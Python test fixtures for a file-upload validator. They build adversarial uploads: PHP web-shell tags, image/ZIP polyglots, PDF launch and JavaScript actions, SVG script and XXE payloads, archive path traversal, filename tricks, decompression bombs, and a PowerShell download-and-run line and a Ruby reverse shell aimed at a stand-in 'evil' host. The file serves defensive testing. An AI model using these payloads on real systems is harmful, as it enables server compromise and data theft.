"""Out-of-the-box adversarial cases, beyond the first-pass corpus.

Each builder yields dicts for Corpus.add. Labels are by construction:
  expected="refuse"  content a correct validator should reject for the given policy;
                     an acceptance is a bypass.
  category="security"   scored in the confusion matrix.
  category="probe"      extractor- or interpreter-dependent, or debatable; reported
                        with its decision but kept out of the matrix, so a maybe is
                        never counted as a definite bypass. Probes are where the
                        surprising findings tend to surface.

All payloads are inert: the code does nothing until some downstream component runs it,
which is the whole point — uploadshield is that downstream component's guard.
"""

from __future__ import annotations

import io
import struct
import zipfile
import zlib
from collections.abc import Iterator

from tests.support import corpus as c

# A harmless marker a server-side interpreter would execute; it only prints.
PHP = b"system($_GET['c']);"


def _case(content, name, policy, attack_class, note, *, expected="refuse",
          category="security", requires_extra=None, declared_type=None, template="adversarial"):
    return dict(content=content, name=name, policy=policy, expected=expected,
                category=category, attack_class=attack_class, template=template,
                requires_extra=requires_extra, declared_type=declared_type, note=note)


# --------------------------------------------------------------------------- #
# A. Server-side code in text that the scanner's pattern may miss.
#    uploadshield scans text for PHP include tags; these probe the edges.
# --------------------------------------------------------------------------- #
def text_code_evasion() -> Iterator[dict]:
    # PHP open tags: uploadshield states it catches these in text, because PHP's
    # include() runs them from a .txt by path. Clearly in scope -> scored.
    php = {
        "php_full": b"<?php " + PHP + b" ?>\n",                 # control: must be caught
        "php_bare_short_tag": b"<? " + PHP + b" ?>\n",          # PHP short_open_tag
        "php_bare_newline": b"<?\n" + PHP + b"\n",
        "php_bare_tab": b"<?\t" + PHP + b"\n",
        "php_echo_wide_space": b"<?=      $_GET[0]; ?>\n",      # >3 spaces after <?=
        "php_echo_tabs": b"<?=\t\t\t$_GET[0]; ?>\n",
        "php_after_text": b"legitimate looking notes\n" * 3 + b"<? " + PHP + b"\n",
    }
    for label, data in php.items():
        yield _case(data, "note.txt", "markup", "text_code_evasion", label)
    # Other server languages in a .txt are inert unless served by that engine with the
    # matching extension (which FilenameCheck blocks), so refusing them is not clearly
    # required: report as probes, not scored bypasses.
    probes = {
        "asp_classic": b"<% CreateObject(\"WScript.Shell\").Run(\"calc\") %>\n",
        "asp_vbscript_decl": b"<%@ LANGUAGE=VBScript %>\n<% x=1 %>\n",
        "jsp_scriptlet": b"<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\n",
        "erb_ruby": b"<%= system(params[:c]) %>\n",
        "ssi_exec": b"<!--#exec cmd=\"id\" -->\n",
        "phar_stub": b"<?php __HALT_COMPILER(); ?>\n",
    }
    for label, data in probes.items():
        yield _case(data, "note.txt", "markup", "text_code_probe", label, category="probe")


# --------------------------------------------------------------------------- #
# B. Polyglots: a file valid as an allowed media type that also carries code or
#    a second format. The appended payloads are uncompressed where the point is
#    that a plaintext scan should see them.
# --------------------------------------------------------------------------- #
def _png_with_text_chunk(keyword: bytes, payload: bytes) -> bytes:
    """A valid PNG with a tEXt chunk (uncompressed metadata) holding payload."""
    png = c.png()
    iend = png.rfind(b"IEND") - 4
    body = keyword + b"\x00" + payload
    chunk = struct.pack(">I", len(body)) + b"tEXt" + body
    chunk += struct.pack(">I", zlib.crc32(b"tEXt" + body) & 0xFFFFFFFF)
    return png[:iend] + chunk + png[iend:]


def polyglots() -> Iterator[dict]:
    png = c.png()
    gif = c.animated_gif()
    jpg = c.image("JPEG")
    zip_php = c.build_zip({"shell.php": b"<?php " + PHP})
    # Appended ZIP (GIFAR family) across carriers.
    yield _case(png + zip_php, "pic.png", "images", "polyglot", "png_zip_appended")
    yield _case(gif + zip_php, "pic.gif", "images", "polyglot", "gif_zip_appended")
    yield _case(jpg + zip_php, "pic.jpg", "images", "polyglot", "jpeg_zip_appended")
    # Plaintext PHP appended to media (full tag -> should be caught by media scan).
    yield _case(png + b"\n<?php " + PHP + b" ?>", "pic.png", "images", "embedded_code",
                "png_php_full_tail")
    # Bare short tag appended to media (media scanner may miss, like the text one).
    yield _case(png + b"\n<? " + PHP + b" ?>", "pic.png", "images", "embedded_code",
                "png_php_short_tail", category="probe")
    yield _case(jpg + b"\xff\xfe\x00\x20<? " + PHP, "pic.jpg", "images", "embedded_code",
                "jpeg_php_short_comment", category="probe")
    # PHP in a PNG tEXt metadata chunk (uncompressed; the classic "PHP in EXIF").
    yield _case(_png_with_text_chunk(b"Comment", b"<?php " + PHP), "pic.png", "images",
                "embedded_code", "png_text_chunk_php_full")
    yield _case(_png_with_text_chunk(b"Comment", b"<? " + PHP), "pic.png", "images",
                "embedded_code", "png_text_chunk_php_short", category="probe")
    # Appended ZIP whose end record is pushed past the 64 KB tail scan window.
    far = png + zip_php + b"\x00" * 70000
    yield _case(far, "pic.png", "images", "polyglot", "png_zip_beyond_tail_window",
                category="probe")


# --------------------------------------------------------------------------- #
# C. PDF active content beyond plain /JavaScript.
# --------------------------------------------------------------------------- #
def pdf_actions() -> Iterator[dict]:
    def pdf(*objs: bytes) -> bytes:
        return c.pdf(*objs)
    variants = {
        "openaction_js": (b"<</Type/Catalog/Pages 2 0 R/OpenAction"
                          b"<</S/JavaScript/JS(app.alert\\(1\\))>>>>"),
        "launch_action": b"<</Type/Catalog/Pages 2 0 R/OpenAction<</S/Launch/F(calc.exe)>>>>",
        "uri_action": b"<</Type/Catalog/Pages 2 0 R/OpenAction<</S/URI/URI(http://evil)>>>>",
        "gotoe_embedded": b"<</Type/Catalog/Pages 2 0 R/OpenAction<</S/GoToE/F(x)>>>>",
        "submitform": b"<</Type/Catalog/Pages 2 0 R/OpenAction<</S/SubmitForm/F(http://evil)>>>>",
        "aa_additional": (b"<</Type/Catalog/Pages 2 0 R/AA<</O"
                          b"<</S/JavaScript/JS(evil\\(\\))>>>>>>"),
        "names_js": (b"<</Type/Catalog/Pages 2 0 R/Names<</JavaScript"
                     b"<</Names[(a)<</S/JavaScript/JS(x\\(\\))>>]>>>>>>"),
        "richmedia": b"<</Type/Catalog/Pages 2 0 R/RichMedia<</S/RichMedia>>>>",
        "embedded_file": (b"<</Type/Catalog/Pages 2 0 R/Names<</EmbeddedFiles"
                          b"<</Names[(a)<</EF<</F 99 0 R>>>>]>>>>>>"),
    }
    for label, catalog in variants.items():
        # A bare /URI action is indistinguishable from a benign hyperlink without
        # structural parsing (every PDF with a link has /URI) -> probe, not scored.
        cat = "probe" if label == "uri_action" else "security"
        yield _case(pdf(catalog), "doc.pdf", "pdf", "pdf_active_content", label, category=cat)


# --------------------------------------------------------------------------- #
# D. SVG active-content vectors beyond <script>.
# --------------------------------------------------------------------------- #
def svg_vectors() -> Iterator[dict]:
    bodies = {
        "foreignobject": '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">'
                         '<script>x()</script></body></foreignObject>',
        "use_external": '<use href="http://evil/x.svg#a"/>',
        "image_js_href": '<image href="javascript:alert(1)"/>',
        "anchor_js": '<a href="javascript:alert(1)"><rect width="9" height="9"/></a>',
        "animate_onbegin": '<rect width="9" height="9"><animate attributeName="x" '
                           'onbegin="alert(1)"/></rect>',
        "set_handler": '<set attributeName="onload" to="alert(1)"/>',
        "script_slash": '<script/xx>alert(1)</script>',
        "handler_element": '<handler>alert(1)</handler>',
        "css_import": '<style>@import url(http://evil/x.css);</style>',
        "css_expression": '<style>rect{width:expression(alert(1))}</style>',
    }
    for label, body in bodies.items():
        yield _case(c.svg(body), "pic.svg", "markup", "svg_active_content", label)
    # External entity / DTD in SVG.
    yield _case((b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
                 b'"file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'),
                "pic.svg", "markup", "svg_active_content", "svg_xxe")


# --------------------------------------------------------------------------- #
# E. Office / OOXML attacks in parts other than word/document.xml.
# --------------------------------------------------------------------------- #
def office_deep() -> Iterator[dict]:
    xxe = c.XXE_DTD
    yield _case(c.docx_with_dtd(part="word/styles.xml"), "d.docx", "documents",
                "active_document", "docx_dtd_in_styles")
    yield _case(c.docx_with_dtd(part="word/header1.xml"), "d.docx", "documents",
                "active_document", "docx_dtd_in_header")
    yield _case(c.docx_with_dtd(dtd=xxe, part="docProps/core.xml"), "d.docx", "documents",
                "active_document", "docx_dtd_in_docprops")
    # A .rels part whose relationship Target escapes the package.
    rels = (b'<?xml version="1.0"?><Relationships '
            b'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/'
            b'2006/relationships/oleObject" Target="../../../../etc/passwd" '
            b'TargetMode="External"/></Relationships>')
    with zipfile.ZipFile(io.BytesIO(c.ooxml("docx"))) as zf:
        parts = {n: zf.read(n) for n in zf.namelist()}
    parts["word/_rels/document.xml.rels"] = rels
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for n, d in parts.items():
            zf.writestr(n, d)
    yield _case(buf.getvalue(), "d.docx", "documents", "active_document", "docx_rels_traversal",
                category="probe")
    # A .doc that is really MHTML carrying script (Word opens MHTML).
    mhtml = (b"MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=\"b\"\r\n\r\n"
             b"--b\r\nContent-Type: text/html\r\n\r\n<html><script>alert(1)</script></html>\r\n"
             b"--b--\r\n")
    yield _case(mhtml, "report.doc", "documents", "active_document", "mhtml_as_doc",
                category="probe")
    # RTF with an embedded OLE object.
    rtf = (rb"{\rtf1\ansi{\object\objemb{\*\objclass Package}{\*\objdata "
           rb"01050000020000000b0000005061636b61676500}}}")
    yield _case(rtf, "report.rtf", "documents", "active_document", "rtf_ole_object",
                category="probe")


# --------------------------------------------------------------------------- #
# F. Archive differentials: where uploadshield's reader and a real extractor
#    might disagree about a member's name or contents.
# --------------------------------------------------------------------------- #
def archive_differentials() -> Iterator[dict]:
    php = b"<?php " + PHP
    # Two entries, same name: extractors differ on which wins; one is dangerous.
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("readme.txt", b"hello")
        zf.writestr("readme.txt", php)  # duplicate
        zf.writestr("note.txt", php)    # also ships a plain dangerous-less file
    yield _case(buf.getvalue(), "b.zip", "archives", "archive", "zip_duplicate_entry",
                category="probe")
    # A tar whose PAX extended header overrides the (benign) ustar name with a bad one.
    data = _tar_pax_override("safe.txt", "shell.php", php)
    yield _case(data, "b.tar", "archives", "archive", "tar_pax_path_override")
    # A gzip whose internal FNAME field is a path traversal (gunzip -N writes there).
    yield _case(_gzip_with_fname(b"../../etc/cron.d/x", b"payload\n"), "b.gz", "archives",
                "archive", "gzip_fname_traversal", category="probe")


def _tar_pax_override(ustar_name: str, pax_path: str, body: bytes) -> bytes:
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w", format=tarfile.PAX_FORMAT) as tf:
        info = tarfile.TarInfo(ustar_name)
        info.size = len(body)
        info.pax_headers["path"] = pax_path
        tf.addfile(info, io.BytesIO(body))
    return buf.getvalue()


def _gzip_with_fname(fname: bytes, body: bytes) -> bytes:
    import gzip

    raw = gzip.compress(body)
    # Rebuild the header with FLG.FNAME set and the name inserted after the 10-byte header.
    header = bytearray(raw[:10])
    header[3] |= 0x08  # FNAME flag
    return bytes(header) + fname + b"\x00" + raw[10:]


# --------------------------------------------------------------------------- #
# G. Filename tricks beyond the first pass: invisibles, normalisation, streams.
# --------------------------------------------------------------------------- #
def unicode_names() -> Iterator[dict]:
    png = c.png()
    names = {
        "zero_width_in_ext": "invoice.p​hp",          # ZWSP splitting "php"
        "zero_width_joiner": "invoice.p‍hp",
        "soft_hyphen_ext": "invoice.p­hp",
        "fullwidth_php": "invoice．ｐｈｐ",  # ．ｐｈｐ
        "nfkd_dotless": "invoice.ṗhp",                 # p with dot above -> NFKD
        "bidi_isolate": "invoice⁦gpj.php⁩",
        "ntfs_ads": "photo.png:evil.php",
        "ntfs_stream_data": "photo.png::$DATA",
        "trailing_dots_many": "shell.php....",
        "dot_slash_prefix": "./././shell.php",
        "double_url_encoded": "..%252f..%252fshell.php",
        "null_truncation": "photo.png\x00.php",
    }
    for label, name in names.items():
        yield _case(png, name, "images", "dangerous_name", label, category="probe")


# --------------------------------------------------------------------------- #
# H. Image decompression / metadata bombs (need Pillow to catch).
# --------------------------------------------------------------------------- #
def image_bombs() -> Iterator[dict]:
    # BMP claiming huge dimensions with a tiny pixel array.
    bmp = bytearray(c.image("BMP"))
    struct.pack_into("<ii", bmp, 18, 30000, 30000)  # width, height in the DIB header
    yield _case(bytes(bmp), "big.bmp", "images", "image_bomb", "bmp_dimension_bomb",
                requires_extra="images", category="probe")
    # GIF with many frames (frame bomb).
    yield _case(c.gif_with_frames(2000), "anim.gif", "images", "image_bomb",
                "gif_many_frames", requires_extra="images", category="probe")
    # A tiny valid PNG carrying a huge uncompressed metadata chunk (metadata bomb).
    yield _case(_png_with_text_chunk(b"Comment", b"A" * (5 * 1024 * 1024)), "meta.png",
                "images", "image_bomb", "png_metadata_bomb", requires_extra="images",
                category="probe")


# --------------------------------------------------------------------------- #
# I. Extension-narrowing smuggling: text/plain narrows to csv/json by extension.
# --------------------------------------------------------------------------- #
def extension_narrowing() -> Iterator[dict]:
    yield _case(c.HTML, "data.csv", "documents", "disguise", "html_as_csv")
    yield _case(c.HTML, "data.json", "wildcard_all", "disguise", "html_as_json")
    yield _case(b"=cmd|'/c calc'!A1\nname,value\n", "data.csv", "documents",
                "office_macros", "csv_dde_formula", category="probe")
    yield _case(b"<? " + PHP + b" ?>", "data.csv", "documents", "text_code_evasion",
                "php_short_as_csv")


# --------------------------------------------------------------------------- #
# J. Parser-robustness / DoS: must fail closed in bounded time, never crash.
# --------------------------------------------------------------------------- #
def nested_dos() -> Iterator[dict]:
    deep_xml = b'<?xml version="1.0"?>' + b"<a>" * 50000 + b"</a>" * 50000
    yield _case(deep_xml, "deep.xml", "markup", "xml_dtd", "deeply_nested_xml",
                category="probe")
    many_attrs = (b'<svg xmlns="http://www.w3.org/2000/svg">'
                  + b"<rect " + b'data-x="1" ' * 20000 + b"/></svg>")
    yield _case(many_attrs, "wide.svg", "markup", "svg_active_content", "svg_many_attrs",
                category="probe")


# --------------------------------------------------------------------------- #
# K. Malware signature placement (needs a YARA rule / the eicar study).
# --------------------------------------------------------------------------- #
def eicar_positions() -> Iterator[dict]:
    e = c.EICAR
    yield _case(b"benign text\n" + e + b"\ntrailer\n", "s.txt", "markup", "eicar_signature",
                "eicar_midfile", requires_extra="yara")
    yield _case(c.build_zip({"s.txt": e}), "s.zip", "archives", "eicar_signature",
                "eicar_in_zip", requires_extra="yara", category="probe")
    yield _case(c.build_zip({"inner.zip": c.build_zip({"s.txt": e})}), "s.zip", "archives",
                "eicar_signature", "eicar_double_zip", requires_extra="yara", category="probe")


# --------------------------------------------------------------------------- #
# L. Magika adversarial: disguised scripts, some padded to fool the model.
# --------------------------------------------------------------------------- #
def magika_adversarial() -> Iterator[dict]:
    scripts = {
        "powershell": b"$c=New-Object Net.WebClient;IEX $c.DownloadString('http://evil')\n",
        "ruby": b"require 'socket';s=TCPSocket.new('evil',4444);exec('/bin/sh')\n",
        "perl": b"use Socket;socket(S,2,1,6);exec('/bin/sh');\n",
        "batch": b"@echo off\r\npowershell -enc ZQB4AGkAdAA=\r\n",
        "python_padded": b"# notes\n" * 400 + b"import os\nos.system('id')\n",
    }
    for label, data in scripts.items():
        # Magika is a probabilistic second opinion, not a guarantee -> probe, not scored.
        yield _case(data, "note.txt", "markup", "magika_script", label,
                    requires_extra="magika", category="probe")


def all_cases() -> Iterator[dict]:
    for fn in (text_code_evasion, polyglots, pdf_actions, svg_vectors, office_deep,
               archive_differentials, unicode_names, image_bombs, extension_narrowing,
               nested_dos, eicar_positions, magika_adversarial):
        for case in fn():
            if case is not None:
                yield case
